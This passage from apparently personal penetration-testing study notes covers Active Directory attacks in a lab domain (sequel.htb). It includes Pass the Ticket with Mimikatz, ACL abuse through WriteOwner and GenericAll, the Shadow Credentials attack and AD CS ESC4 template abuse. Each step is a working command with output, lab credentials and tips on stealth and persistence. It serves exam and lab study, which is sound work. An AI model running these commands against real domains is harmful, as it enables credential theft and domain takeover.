href="PrivEsc--Windows--Sysadmin_Stuff--Kerberos_104.html#Obtain a TGT">Rubues</a> on a Domain joined Windows host, or use <a href="PrivEsc--Linux--SysAdmin_Stuff--Linux_in_AD_103.html#Obtain a TGT">Impacket</a> remotely from your Linux machine.</p><p></p><p><h2>Using TGT</h2></p><p><h3>Locally</h3></p><p>A general rule for most Windows utilities is that a TGT will only be used if you specify a remote host using a syntax like <strong>\\HOSTNAME</strong>.</p><p></p><p>Many tools will fall back on NTLM authentication <span style="color:#ff0000;">if you use an IP address </span>like <strong>\\192.168.45.102</strong>. This means you <span style="color:#ff0000;">won&#39;t be able to impersonate</span> other users.</p><p></p><p><h3>Remotely</h3></p><p>See <a href="PrivEsc--Linux--SysAdmin_Stuff--Linux_in_AD_103.html">Linux in AD</a>. You&#39;ll need to convert a KIRBI TGT into CCACHE &amp; specify it with an Env Var. Other than Impacket, most tools will also require a <a href="PrivEsc--Linux--SysAdmin_Stuff--Linux_in_AD_103.html#krb5.conf">Kerberos Configuration</a> file.</p><p></p><p><a name="PtT"></a><h1>Pass the Ticket (PtT)</h1></p><p>[Win 116-117, 120 &amp; PDF 792]</p><p></p><p>Whereas OPtH lets you get a TGT, PtT lets you <span style="color:#ff0000;">get a TGS</span>. If the TGS belongs to the current user, Admin Privs aren&#39;t needed.</p><p></p><p>The main purpose is to <span style="color:#ff0000;">steal another user&#39;s TGS from RAM</span> &amp; <span style="color:#ff0000;">impersonate them to access a restricted resource</span>. Assuming PAC Validation isn&#39;t enabled, it doesn&#39;t matter that you aren&#39;t signed in as that user.</p><p></p><p>You can export a TGS from one host &amp; re-inject it elsewere on the LAN, allowing you to Auth to a specific SVC via a diff host.</p><p></p><p><h3>Example Use Case</h3></p><p>You&#39;re the Local Admin on MS01 &amp; another user (&quot;dave&quot;) has an existing session. Your current user can&#39;t access the “backup” folder on MS02, but dave can.</p><p></p><p>Use Mimikatz to extract all tickets in RAM, &amp; inject dave&#39;s MS02 TGS into your own session. This allows you to access the restricted folder using your current account.</p><p></p><p>Even if dave can&#39;t get RCE on MS02, you&#39;re still able to utilize his account.</p><p></p><p><span style="color:#060f94;text-decoration:underline;">Q</span>: Why can&#39;t you just dump dave&#39;s NTLM &amp; impersonate them via PtH to access the restricted SVC? Is this only useful for tools that require KRB Auth?</p><p></p><p><span style="color:#060f94;text-decoration:underline;">A</span>: [Win 116] Maybe you can only use PtH to sign in as a user if they&#39;re the built-in Local Admin or an AD Domain Account. (But if they&#39;re using KRB, wouldn&#39;t they be a Domain Account anyways?)</p><p></p><p><span style="color:#060f94;text-decoration:underline;">Q</span>: Is there ever a scenario where a user&#39;s TGS would be in RAM, but their hashes wouldn&#39;t be?</p><p></p><p><span class="subheading">Example</span>: In Admin PS, launch Mimikatz. I think you can then close Mimikatz &amp; still have the TGS in that PS Session.</p><p></p><p></p><p><em>privilege::debug</em><em></em></p><p><em>sekurlsa::tickets /export</em><em></em></p><p><em>dir *.kirbi</em></p><p></p><p><strong>Mode LastWriteTime Length Name</strong><strong></strong></p><p><strong>---- ------------- ------ ----</strong><strong></strong></p><p><strong>-a---- 9/14/2022 6:24 AM 1561 </strong><strong><span style="color:#ff0000;">[0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi</span></strong></p><p></p><p><em>kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi</em><em></em></p><p><em></em><em></em></p><p><em>klist</em><em></em></p><p><em>ls \\web04\backup</em></p><p></p><p><a name="Abusing ACLs"></a><h1>Abusing ACLs</h1><h1></h1></p><p><h1></h1>[Win 132, CTF B 146-147, OSCP? ]</p><p></p><p>See <a href="PrivEsc--Windows--Sysadmin_Stuff--ACL_+_ACE_97.html#ACL">ACL Background</a> info, <a href="PrivEsc--Windows--Sysadmin_Stuff--ACL_+_ACE_97.html#Important ACLs">important permissions</a>, &amp; this <a href="https://github.com/b4rdia/HackTricks/blob/master/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md">resource</a> for exploitation</p><p></p><p><h2>Enumeration</h2></p><p>You can use PowerView.ps1 to enumerate ACLs. Upload it to the target, bypass the PS execution policy, &amp; import it into target&#39;s RAM.</p><p></p><p><span style="color:#060f94;text-decoration:underline;">Tip</span>: To use GUI instead, <span style="color:#ff0000;">BloodHound</span> <strong>Node Info</strong> → <strong>Outbound Object Control</strong></p><p></p><p><span style="color:#060f94;text-decoration:underline;">Q</span>: Will Winpeas will also reliably enum ACLs? If so, can it test multiple accounts at the same time like PowerView can?</p><p></p><p><h3>Testing Multiple Accounts</h3></p><p>You can enumerate the permissions for every account that you have access to by creating an array.</p><p></p><p><em>$users = @(&quot;ryan&quot;, &quot;oscar&quot;, &quot;sql_svc&quot;, &quot;rose&quot;)</em><em></em></p><p><em></em><em></em></p><p><em>Find-InterestingDomainAcl -ResolveGuids | Where-Object { $_.IdentityReferenceName -in $users } | Select-Object IdentityReferenceName, ObjectDN, ActiveDirectoryRights</em></p><p></p><p><strong>IdentityReferenceName						 ObjectDN                                             																		ActiveDirectoryRights</strong><strong></strong></p><p><strong>--------------------- 									------------                                             																		---------------------</strong><strong></strong></p><p><strong>ryan						                  						</strong><strong><span style="color:#ff0000;">CN=Certification Authority,CN=Users,DC=sequel,DC=htb</span></strong><strong>            WriteOwner</strong></p><p></p><p></p><p><h2>Interpretting Results</h2></p><p>If the <strong>ObjectDN</strong> includes <strong>CN=Users</strong>, you already know the object class is a User...</p><p></p><p><h3>Determine Object Class</h3></p><p>Determine what kind of object the <strong>ObjectDN</strong> is (e.g. user, group, container, etc).</p><p></p><p><em>Get-ADObject -Identity &quot;CN=Certification Authority,CN=Users,DC=sequel,DC=htb&quot; -Properties objectClass</em></p><p></p><p><strong>objectclass</strong><strong></strong></p><p><strong>-----------</strong><strong></strong></p><p><strong>{top, person, organizationalPerson, </strong><strong><span style="color:#ff0000;">user</span></strong><strong>}</strong></p><p></p><p><h3>For Users</h3></p><p><em>Get-ADUser -Identity &quot;CN=Certification Authority,CN=Users,DC=sequel,DC=htb&quot; -Properties SamAccountName</em></p><p></p><p><strong>DistinguishedName : CN=Certification Authority,CN=Users,DC=sequel,DC=htb</strong><strong></strong></p><p><strong>Enabled           : True</strong><strong></strong></p><p><strong>GivenName         : Certification</strong><strong></strong></p><p><strong>Name              : Certification Authority</strong><strong></strong></p><p><strong>ObjectClass       : user</strong><strong></strong></p><p><strong>ObjectGUID        : 92385e3e-0137-4ce2-8c89-ab65146f03fd</strong><strong></strong></p><p><strong>SamAccountName    : </strong><strong><span style="color:#ff0000;">ca_svc</span></strong><strong></strong></p><p><strong>SID               : S-1-5-21-548670397-972687484-3496335370-1607</strong><strong></strong></p><p><strong>Surname           : Authority</strong><strong></strong></p><p><strong>UserPrincipalName : ca_svc@sequel.htb</strong></p><p></p><p><h3>For Groups</h3></p><p><em>Get-ADGroup -Identity &quot;CN=Certification Authority,CN=Users,DC=sequel,DC=htb&quot; -Properties SamAccountName</em></p><p></p><p><h3>Neither user or group (e.g. a service object or system container)</h3></p><p>You can still find out who has rights over it with the following command</p><p></p><p><span style="color:#060f94;text-decoration:underline;">Note</span>: <strong>AD:\ </strong>works only if the ActiveDirectory module + RSAT are set up and the AD drive is mounted. If you get an error, you&#39;ll need to try another method.</p><p></p><p><em>(Get-Acl &quot;AD:\CN=Certification Authority,CN=Users,DC=sequel,DC=htb&quot;).Access</em></p><p></p><p><span class="subheading">Alternate Method</span>: Search AD for users/groups who have rights over it. Re-run the enumeration command again, but this time filter based on that object.</p><p></p><p><em>Find-InterestingDomainAcl -ResolveGuids | Where-Object { $_.ObjectDN -eq &quot;CN=Certification Authority,CN=Users,DC=sequel,DC=htb&quot; } | Select-Object IdentityReferenceName, ActiveDirectoryRights</em></p><p></p><p><a name="Abusing WriteOwner"></a><h2>Abusing WriteOwner</h2></p><p>Background in <a href="PrivEsc--Windows--Sysadmin_Stuff--ACL_+_ACE_97.html#Important ACLs">important permissions</a></p><p></p><p>You&#39;ll typically be using <strong>WriteOwner</strong> to give youself <a href="PrivEsc--Windows--Active_Directory_10.html#Abusing GenericAll">GenericAll</a> permissions, which opens up multiple attack vectors.</p><p></p><p><h3>Tools</h3></p><p><strong><span style="color:#060f94;text-decoration:underline;">★</span></strong> <span class="subheading">Impacket</span>: <span style="color:#ff0000;">Impacket is the most reliable</span> method, since it&#39;ll <a href="PrivEsc--Windows--Sysadmin_Stuff--ACL_+_ACE_97.html#ACLs in AD">bypass Local security policies</a>. Works remotely as long as you can query the DC via SMB / LDAP.</p><p></p><p><span class="subheading">PowerView</span>: You can also use PowerView, but it&#39;s often flagged by AV &amp; is less stealthy than the LotL techniques. Upload <a href="file:///usr/share/windows-resources/powersploit/Recon/PowerView.ps1">PowerView.ps1</a>, Bypass the <a href="PrivEsc--Windows--RCE_33.html#Bypass Exec Policy">PS Execution Policy</a>, &amp; import it.</p><p></p><p><span class="subheading">LotL</span>:  <strong>Set-Acl</strong> in PowerShell (more tedious, but doesn&#39;t rely on PowerView). ADSI and .NET in PowerShell to manually change the owner. GUI tools like AD ACL Editor or LDP.exe for visual control.</p><p></p><p><h3>Grant GenericAll Permissions (Full Control)</h3></p><p>If you see the following error, try using Impacket.</p><p></p><p><strong>Exception calling &quot;CommitChanges&quot; with &quot;0&quot; argument(s): &quot;Access is denied.</strong></p><p></p><p><span class="subheading">Impacket</span>:<em> </em>For example usage, see <a href="PrivEsc--Windows--Active_Directory_10.html#GenericOwner to GenericAll">Shadow Credentials</a> Attack.</p><p></p><p><span class="subheading">PowerView</span>: Run with <strong>-Verbose</strong> to see changes made &amp; any errors that occur. Afterwards, verify permissions by running the ACL Enumeraction command again.</p><p></p><p><span style="color:#060f94;text-decoration:underline;">Note</span>: I believe PowerView tries to automatically give you ownership of the account via <strong>GenericOwner</strong>, &amp; then use that to get <strong>GenericAll</strong>.</p><p></p><p><em>Add-DomainObjectAcl -TargetIdentity &quot;CN=Certification Authority,CN=Users,DC=sequel,DC=htb&quot; -PrincipalIdentity &quot;ryan&quot; -Rights All -Verbose</em></p><p></p><p></p><p><a name="Abusing GenericAll"></a><h2>Abusing GenericAll</h2></p><p><strong>GenericAll</strong> gives you permission to take ownership of the object, but it doesn&#39;t automatically make you the owner.</p><p></p><p><h3>Attack Vectors</h3></p><p></p><p><span class="subheading">Shadow Credentials Attack</span>: <span style="color:#ff0000;">Preferred</span> <a href="PrivEsc--Windows--Active_Directory_10.html#Shadow Credentials Attack">method</a> for multiple reasons. You don&#39;t lose the account&#39;s original password, you don&#39;t need to crack a hash, it&#39;s more stealthy &amp; has less risk of disruptions compared to other attacks.</p><p></p><p><span class="subheading">Targeted Roasting</span>: Targeted Kerberoasting / AS-REP Roasting (outlined <a href="https://www.linkedin.com/pulse/as-rep-roasting-kerberoasting-nathan-miller-k0v6c">here</a>) is when you make an account vulnerable to one of these attacks, crack the hash, &amp; then undo the change. If you can&#39;t crack their hash, this attack vector isn&#39;t useful.</p><p></p><p><span class="subheading">Resetting Target&#39;s Password</span>: Not an ideal method, since you lose access to the account&#39;s original password (which may be re-used for Cred Stuffing), it&#39;s not stealthy, &amp; causes disruptions for clients.</p><p></p><p><span class="subheading">RBCD</span>: The Shadow Credentials Attack is preferable to Resource-Based Constrained Delegation. It&#39;s more complicated &amp; requires control over an account with an SPN (which you can create, but it&#39;s not stealthy &amp; requires clean-up). <a href="https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html">Good Luck</a>.</p><p></p><p><a name="Shadow Credentials Attack"></a><h1>Shadow Credentials Attack + Windows Hello for Business (WHfB)</h1></p><p>[Win 130-133, CTF D 39-41]</p><p></p><p><h2>Background</h2></p><p>See the <a href="https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab">original research</a>, &amp; <a href="https://medium.com/@jason.giusto90/escape-two-from-hackthebox-395a87cac956">example exploitation</a></p><p></p><p>If  a user requests a U2U Service Ticket from itself to itself, they will  be able to decrypt it and access the PAC and the NTLM hash.</p><p></p><p>This means that <span style="color:#ff0000;">if you can write to</span> the <strong><span style="color:#ff0000;">msDS-KeyCredentialLink</span></strong><span style="color:#ff0000;"> property of a user</span>, you can <span style="color:#ff0000;">retrieve that user&#39;s NT hash</span>.</p><p></p><p><h3>Advantages</h3></p><p>When abusing Key Trust, we are effectively adding alternative credentials to the account, or “Shadow Credentials”, allowing for obtaining a TGT and subsequently the NTLM hash for the user/computer.</p><p></p><p>Those Shadow Credentials would <span style="color:#ff0000;">persist even if the user/computer changed their password</span>.</p><p></p><p>Abusing Key Trust for computer objects requires additional steps after obtaining a TGT and the NTLM hash for the account. There are generally two options:</p><p><ol><li>Forge an RC4 silver ticket to impersonate privileged users to the corresponding host.</li></ol></p><p><ol><li> Use the TGT to call S4U2Self to impersonate privileged users to the corresponding host. This option requires modifying the obtained Service Ticket to include a service class in the service name.</li></ol></p><p></p><p>Key Trust abuse has the added benefit that it doesn’t delegate access to another account which could get compromised, &amp; is instead restricted to the private key generated by the attacker.</p><p></p><p>In addition, it doesn’t require creating a computer account that may be hard to clean up until privilege escalation is achieved.</p><p></p><p><a name="GenericOwner to GenericAll"></a><h2>Setup</h2></p><p>The Shadow Credentials Attack may work with a variety of permissions, but in this example ryan has <strong>GenericOwner</strong> over the ca_svc account. The setup is 2 steps:</p><p><ol><li>Leverage <strong>GenericOwner</strong> to take ownership over the ca_svc account. (<strong>impacket-owneredit</strong>)</li></ol></p><p><ol><li>Leverage this ownership to give yourself <strong>GenericAll</strong> (Full Control) over the ca_svc account. This access will persist even if someone else becomes the owner later. (<strong>impacket-dacledit</strong>)</li></ol></p><p></p><p><span style="color:#060f94;text-decoration:underline;">Note</span>: Depending on your version of Python, Impacket may throw errors (i.e. <strong>invalid escape sequence</strong>...), but you can ignore them as long as output also says _____ <strong>modified successfully!</strong></p><p></p><p><h3>Use GenericOwner to take Ownership</h3></p><p></p><p><em>impacket-owneredit -action write -new-owner &#39;ryan&#39; -target &#39;ca_svc&#39; &#39;sequel.htb&#39;/&#39;ryan&#39;:&#39;WqSZAF6CysDQbGb3&#39;</em></p><p></p><p><span class="subheading">Explanation</span>:  <strong>GenericOwner</strong> means you have permission to take ownership of this object, but that permission doesn’t automatically make you the owner; it just means you&#39;re allowed to set yourself as the owner.</p><p></p><p>So even though you had <strong>GenericOwner</strong>, you weren’t yet the actual owner until this command ran.</p><p></p><p>This command explicitly set the <strong>Owner</strong> field of the ca_svc account&#39;s <strong>nTSecurityDescriptor</strong> to ryan by using the <strong>GenericOwner</strong> right by doing the following:</p><p><ol><li>Performed a raw LDAP modify to the nTSecurityDescriptor</li></ol></p><p><ol><li>Set the Owner SID to ryan&#39;s SID</li></ol></p><p></p><p><h3>Use Ownership to get GenericAll</h3></p><p></p><p><em>impacket-dacledit -action &#39;write&#39; -rights &#39;FullControl&#39; -principal &#39;ryan&#39; -target &#39;ca_svc&#39; sequel.htb/ryan:&#39;WqSZAF6CysDQbGb3&#39;</em></p><p></p><p><span class="subheading">Explanation</span>: This added a new ACE (Access Control Entry) to the object&#39;s DACL, granting the user ryan FullControl (<strong>GenericAll</strong>) over the ca_svc user object.</p><p></p><p>So now, ryan not only owns the object, but also has a persistent, explicit ACE granting full rights.</p><p></p><p>Being the owner gives you implicit right to edit the DACL, but it doesn’t persist if someone changes ownership later. Adding FullControl via DACL makes your access durable, even if someone else becomes the owner later.</p><p></p><p><h2>Retrieve NTLM Hash</h2></p><p>Leverage these permissions to retrieve the NTLM hash for the target account. <a href="https://github.com/ly4k/Certipy">Certipy</a> will handle all the steps automatically.</p><p></p><p>Confirm the creds are valid using <strong>nxc smb</strong>.</p><p></p><p><h3>Remotely</h3></p><p><em>certipy-ad shadow auto -u ryan@sequel.htb -p &#39;WqSZAF6CysDQbGb3&#39; -account ca_svc</em></p><p></p><p><a name="Local Shadow Creds"></a><h3>Locally</h3></p><p><strong>Whisker.exe</strong> will output a command for <strong>Rubeus.exe</strong>, &amp; that command will output the NTLM hash along with a TGT listed under <strong>base64(ticket.kirbi)</strong></p><p></p><p><em>.\Whisker.exe add /target:ca_svc</em></p><p></p><p><em>.\Rubeus.exe asktgt</em> (...ETC...)</p><p></p><p><span class="subheading">Leveraging TGT</span>: You should also be able to import that TGT into your current session to access the target account.</p><p></p><p><span style="color:#060f94;text-decoration:underline;">Note</span>: Base64 TGT is output in an improper format. Use <a href="https://gchq.github.io/CyberChef/#recipe=Find_/_Replace(%7B'option':'Regex','string':'%20%20%20%20%20%20'%7D,'',true,false,true,false)Find_/_Replace(%7B'option':'Regex','string':'%5C%5Cn'%7D,'',true,false,true,false)&input=ZG9JR1FqQ0NCajZnQXdJQkJhRURBZ0VXb29JRlh6Q0NCVnRoZ2dWWE1JSUZVNkFEQWdFRm9Rd2JDbE5GVVZWRlRDNUlWRUtpSHpBZG9BTUMKICAgICAgQVFLaEZqQVVHd1pyY21KMFozUWJDbk5sY1hWbGJDNW9kR0tqZ2dVYk1JSUZGNkFEQWdFU29RTUNBUUtpZ2dVSkJJSUZCUSs5Y0tnYnZqYTYKICAgICAgTCtmejJkQlk3cFZxbjdrdWNPRWpzazFxTEZGNDZPUnlaVksvTXZHVy9GK1VORlMrMndBWVdqTzR2MVJVOWE3cWpJaXJpRGduUmRJRCtLRTYKICAgICAgV2c3QkV0c0swczBZVzNTVUlSbTd1TlhVeEtqeEVPZUNjTmVua2x1Ym1qaVNsVDNvOWN5cU0rOWlDNWdzbUtSUUJKenc1SExEYkh1RzJhMWkKICAgICAgbklRZWtnRnQxV3Z2aU0vTlVMS2JjaXRwQTU0d29CTGtsV1J5QkZWbExhb0pwa2I5dTdsTjJPV2RYcFVadnRENlZBOTRVTDViOVppSlpEalUKICAgICAgcXBya0tiOVhiK0tsMWdqaVBFbUdUcGc3V0prYmo1SGVHcy81ZFpMT1VIV0NhMURFRldjbW02YXc4VGN4Q0dDZFpzZHBJV2E3bE1XYTUraW4KICAgICAgcmNZMStGVHlIdk8zM0ZJdUdUaFQwSnEvMHk0b3FWdyszYkxJYXBta3laL2s4U295bFpBaWZWcHZKZE1lOUtVcmdXV0xxcjloZGF5ZklqalEKICAgICAgTkZ2OUt5akxpcjRrS2srMXJuRlFQUHE5SjJJMmlaSGJIZEpDNCtISzRrd1ZCUWhZdWUwRy9xK21YT0ovaG00SVdKYnVPUExjdEZnZ2s5VzAKICAgICAgWEl4VUluT09DTndOODd3c1ZnYnVMRHZIRnRhdkJQenRRall5OHZMRCttVFEyL3JsQ3RjaEgvRmRuVExERCsyMEFHSE5GQzdZQWVtQVlBUFYKICAgICAgZGFBUmovSi8yVlZOMXg3M1J2NHBwalRpYUExMHVjTXJKYUxMVDdXUGZQN3pnbnNHcUpmeUppaHNIL1RnN1kwd2tpV0ZyZ2tQNDJpYmlKRWMKICAgICAgUnc1TTJHM2graS9tTWZlZlM0RFI4Mk45L1ZiWEFub1dMMVRjeTViTlVaa3dsYjh4R21OTno4bE93MGIzQnBhV1FIenc2aDNwL1NIMGlCQUYKICAgICAgcUJid3F6OThlYWcrak1McHJoUGo3cE1pbktxeGZnaC9GRmRnYXI2NkdDWDNSMUFaN1dLZyticWdQYTJKbHhERkUvNXFpZVlSd3VYU2RKaGcKICAgICAgWFlneUVPYlNhazZMM3ZKK09TL3YrQ0xOUGRjcXplUzFicU4zS3R1RnZ0dW5xaVFSOUEyWXlYT0RiSnVreUk1TkVyOFV5aWZ4YWxLN2ZNN3MKICAgICAgdXIvbTJoMUZ1RytnTjVrVWJXWktibTIrWVZlWkdKcnZ4cis4YzM0UmRyUVdEKzl4dXFvU1lrejBGOUJ6cUVMaEo1dkRxcEdZVkxEaHJUcVQKICAgICAgZVMvS2sveWFMcFR0L1plYWl5bm1GU3AzMFJVWmdLbDQyNm9mUURDdC82QVFtdTVmZEtnU1pnVUpoL29XVGJCWmx5aUM5R0RtWk4ydzJIOE4KICAgICAgTVMxOHQ4V0N2OHZVVkpmVjl4TnNULzFJZHJ5aGhHeVRhanJFSDc0S1VyYVRTZGpBSVVSNDR6bzc5NkJueDNFbmdKekRPTkpwbDNKOEFGazcKICAgICAgRFRsK1hHd0lseFN4dGdXOWVMamdFTU5QNE1Dc1JBMVpYWHVGcFpJMko2eFRuMVRBdVMyY1RRUE9ESzR0RGFzbEFrekVZRlFLRzVMMlZLOWQKICAgICAgZHdocjVEdFBReWpRQS9mbTZ5T3ArYUZXVFMzb2FXVHNSZUFaR1cyemdZb3pjSklIaDN5V1pWQTJGeStwblN4eTIwWFFoTThQUm9RdlE2emoKICAgICAgbVJMSmcwK2RKQWI3NGs2ZGhBMGhPT0lHUFQxWjZTS0FHbmxHZ1ZjZ3hLZ3NPWlpCNmRDWDI2MHpoTlltTzVJZGZKVGhFRVRQdUc0QVlKZ0MKICAgICAgUDR1clZKNUlkZENqcCt6b3RUOGdVdkFSS3JUcnU0WS8zUGJwNzVpVWtDNmViZ0FEUGxPNWQ0WFRmaHJ2ZVhmYW5KN3ltS2MrYU9Ia0FONDcKICAgICAgaUp6WkR5cng1NmIxbkhtQjhxc2FONXY5YUFMWUpHbGs0dHlwSnRqSHpqM0pGZ3RoUGtQdVRWeFJMS3gxUGc5TDVhcjlSb09Ec0JMblQ3OVEKICAgICAgcjRSWTdOL3hudG1lRGQyRkxqdzVDWngrN1A0amZyK0VUa1JHMmw4RE1EV2N1dHRaMUpSclkzb3FtWmRRMXI0VEtoZmMxUkFDK3FhUjhxYU8KICAgICAgbHFGSWV5N2Q5NzRkazNrOVFzb2pBNnB5MTh2blRwT1pJbFJ5M0hGR2xQaHdMem1DSCsvbVcyUHZnSm5qY0ZMM3pxMkdvVmsyM3JXVmFlM3YKICAgICAgZmt5TGhaRXFjd1JSdHBwdXYraUZhU21qZ2M0d2djdWdBd0lCQUtLQnd3U0J3SDJCdlRDQnVxQ0J0ekNCdERDQnNhQWJNQm1nQXdJQkY2RVMKICAgICAgQkJEQTN5K3VIc25QZ3VWRmhqRDRPVmpIb1F3YkNsTkZVVlZGVEM1SVZFS2lFekFSb0FNQ0FRR2hDakFJR3daallWOXpkbU9qQndNRkFFRGgKICAgICAgQUFDbEVSZ1BNakF5TlRBME1Ua3hOelF4TlRSYXBoRVlEekl3TWpVd05ESXdNRE0wTVRVMFdxY1JHQTh5TURJMU1EUXlOakUzTkRFMU5GcW8KICAgICAgREJzS1UwVlJWVVZNTGtoVVFxa2ZNQjJnQXdJQkFxRVdNQlFiQm10eVluUm5kQnNLYzJWeGRXVnNMbWgwWWc9PQ">Cyberchef</a> to strip newlines (<strong>\n</strong>) &amp; the 4x extra spaces used for indentation (    ).</p><p></p><p><em>.\Rubeus.exe ptt /ticket:BASE64</em></p><p></p><p><a name="Exploit AD CS"></a><h1>AD CS (Active Directory Certificate Services)</h1></p><p>[CTF D 41-43]</p><p></p><p>For Background of <a href="PrivEsc--Windows--Sysadmin_Stuff--AD_CS_+_PKI_98.html">AD CS</a> see this <a href="https://posts.specterops.io/certified-pre-owned-d95910965cd2">article</a> &amp; this <a href="https://medium.com/@offsecdeer/adcs-exploitation-part-1-common-attacks-b7ae62519828">overview</a>.</p><p></p><p>Also see Hacktricks <a href="https://github.com/b4rdia/HackTricks/blob/master/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md">guide</a>, &amp; example <a href="https://medium.com/@jason.giusto90/escape-two-from-hackthebox-395a87cac956">exploitation</a> (the Priv Esc section).</p><p></p><p><h2>Identify Vulnerable Template</h2></p><p>Both the Local &amp; Remote methods have an <span style="color:#ff0000;">option to identify vulnerable templates</span>, but this is done <span style="color:#ff0000;">in the context of the current user</span>!</p><p></p><p>For example, there is a template that the <strong>ca_svc</strong> user can exploit, but it won&#39;t appear as a vulnerable template if you&#39;re using <strong>ryan</strong> for template enumeration &amp; <span style="color:#ff0000;">will be missed</span>. You have 2 options:</p><p><ol><li>List all templates without filtering for vulnerable templates. You can then manually check if any are exploitable via compromised users / groups. Use the following commands <span style="color:#ff0000;">without the </span><strong><span style="color:#ff0000;">vulnerable</span></strong><span style="color:#ff0000;"> arg</span>.</li></ol></p><p><ol><li>Repeat vulnerable template enumeration using EVERY compromised account.</li></ol></p><p></p><p><h3>Remote Enumeration</h3></p><p>There are multiple ways to Auth (e.g. using an NTLM obtained via <a href="PrivEsc--Windows--Active_Directory_10.html#Shadow Credentials Attack">Shadow Credentials</a> attack). There is no colon prepended for the NTLM hash.</p><p></p><p>This command creates JSON &amp; TXT files with template info, &amp; a ZIP file which allegedly contains “BloodHound data” but I couldn&#39;t import it (BloodHound said it was an &quot;invalid file type&quot;).</p><p></p><p><em>certipy-ad find </em><em><span style="color:#cdab8f;">-vulnerable</span></em><em> -u ca_svc@sequel.htb -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -dc-ip 10.10.11.51</em></p><p></p><p><h3>Local Enumeration</h3></p><p>If you&#39;re only checking for “vulnerable” templates, you need RCE as the user who can leverage that vulnerability. If you can&#39;t RCE as that user, you can either try the Remote Enumeration method or list all templates (instead of just “vulnerable” ones).</p><p></p><p><em>.\Certify.exe find </em><em><span style="color:#cdab8f;">/vulnerable</span></em></p><p></p><p><h3>Looting</h3></p><p>There are several important fields that you&#39;ll use for exploitation.</p><p></p><p>There may be more than 1 <strong>Certificate Authorities</strong> (<strong>CA</strong>), so ensure you&#39;ve got the CA that corresponds to the vulnerable template (it&#39;ll be listed in the template so you can compare the names).</p><p></p><p>Various types of Permissions will be listed, but you don&#39;t need them all (e.g. <strong>Enrollment Permissions</strong> isn&#39;t necessary).</p><p></p><p>For example, ca_svc is in the custom <strong>Cert Publishers</strong> group which has perms (listed under Groups &amp; DACL) over the <strong>DunderMifflinAuthentication</strong> template, which makes it vulnerable.</p><p></p><p><strong>Certificate Authorities</strong></p><p><strong>	</strong><strong><span style="color:#ff0000;">CA Name</span></strong><strong>: sequel-DC01-CA</strong><strong></strong></p><p><strong>	</strong><strong><span style="color:#ff0000;">DNS Name</span></strong><strong>: DC01.sequel.htb</strong><strong></strong></p><p><strong>	</strong><strong></strong></p><p><strong>Certificate Templates</strong><strong></strong></p><p><strong>	</strong><strong><span style="color:#ff0000;">Template Name</span></strong><strong>: DunderMifflinAuthentication</strong><strong></strong></p><p><strong>	</strong><strong><span style="color:#ff0000;">Certificate Authorities</span></strong><strong>: sequel-DC01-CA</strong><strong></strong></p><p><strong>	...</strong><strong></strong></p><p><strong>	Permissions</strong><strong></strong></p><p><strong>	...</strong><strong></strong></p><p><strong>[ ! ] Vulnerabilities				</strong>		(if you used the <span style="color:#cdab8f;">vulnerable</span> argument for the enumeration command)<strong></strong></p><p><strong>	ESC4: ‘SEQUEL.HTB\\Cert Publishers’ has dangerous permissions</strong></p><p></p><p><h2>ESC4</h2></p><p>See <a href="PrivEsc--Windows--Sysadmin_Stuff--AD_CS_+_PKI_98.html#ESC4">ESC4 background</a>.</p><p></p><p><h3>Remote Exploitation</h3></p><p><span class="subheading">Make Backup &amp; Edit Config</span>: This command does 2 things: it saves the original configuration in a JSON file (with the <strong>-save-old</strong> arg), &amp; then it edits the config so the template is vulnerable to ESC1.</p><p></p><p><em>certipy-ad template -username &#39;ca_svc@sequel.htb&#39; -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -template DunderMifflinAuthentication -save-old</em></p><p></p><p><span class="subheading">Exploit ESC1</span>: This <span style="color:#ff0000;">creates a PFX cert</span>,  which you&#39;ll use later to <a href="PrivEsc--Windows--Active_Directory_10.html#Auth via Certificate">authenticate</a> as the target Domain user (i.e. Administrator). See <a href="PrivEsc--Windows--Active_Directory_10.html#Troubleshooting ESC4">Troubleshooting</a> for DNS issues.</p><p></p><p><em>certipy-ad req -username &#39;ca_svc@sequel.htb&#39; -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -ca sequel-DC01-CA -target DC01.sequel.htb -template DunderMifflinAuthentication -upn administrator@sequel.htb -ns 10.10.11.51 -dc-ip 10.10.11.51</em></p><p></p><p><span class="subheading">Restore Configuration</span>: Use the JSON file that was generated by the 1st command to revert the template config to its original state (before it was altered to be vulnerable to ESC1).</p><p></p><p><em>certipy-ad template -username &#39;ca_svc@sequel.htb&#39; -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -ca sequel-DC01-CA -target DC01.sequel.htb -template DunderMifflinAuthentication -configuration DunderMifflinAuthentication.json -ns 10.10.11.51 -dc-ip 10.10.11.51</em></p><p></p><p><a name="Troubleshooting ESC4"></a><h3>Troubleshooting</h3></p><p><strong>CERTSRV_E_SUBJECT_DNS_REQUIRED</strong>...<strong>DNS Name is unavailable &amp; cannot be added to the Subject Alternate Name</strong></p><p></p><p>Without the <strong>-ns</strong> arg, I got the error <strong>CERTSRV_E_SUBJECT_DNS_REQUIRED</strong> (even when using the <strong>-dns</strong> arg). </p><p></p><p><span class="subheading">Solutions</span>: The Name Server will typically be the Domain Controller, so you&#39;d use that IP address.</p><p><ol><li>Add the Name Server to <strong>/etc/hosts</strong> like it&#39;s a subdomain. This may / may not matter.</li></ol></p><p></p><p><strong>10.10.11.51 sequel.htb DC01.sequel.htb</strong></p><p><ol><li>Specify the Name Server with <strong>-ns</strong>. If that doesn&#39;t work, try the <strong>-dns</strong> arg. If that doesn&#39;t work, try both. (e.g. the DC&#39;s IP).</li></ol></p><p></p><p><h3>Impersonate User Locally via Interactive Protocol</h3></p><p>I believe that Local exploitation will only work if one of the following things are true:</p><p></p><p>A) Your current user (e.g. ryan) can access the target using an interactive protocol like RDP. (The following steps assume this is the case)</p><p></p><p>B) You can access the machine using the target account (e.g. ca_svc).</p><p></p><p><span class="subheading">Obtain TGT</span>: You can perform the <a href="PrivEsc--Windows--Active_Directory_10.html#Local Shadow Creds">Shadow Credentials Attack </a>Locally &amp; use Rubeus to inject the TGT into the current session.</p><p></p><p><span 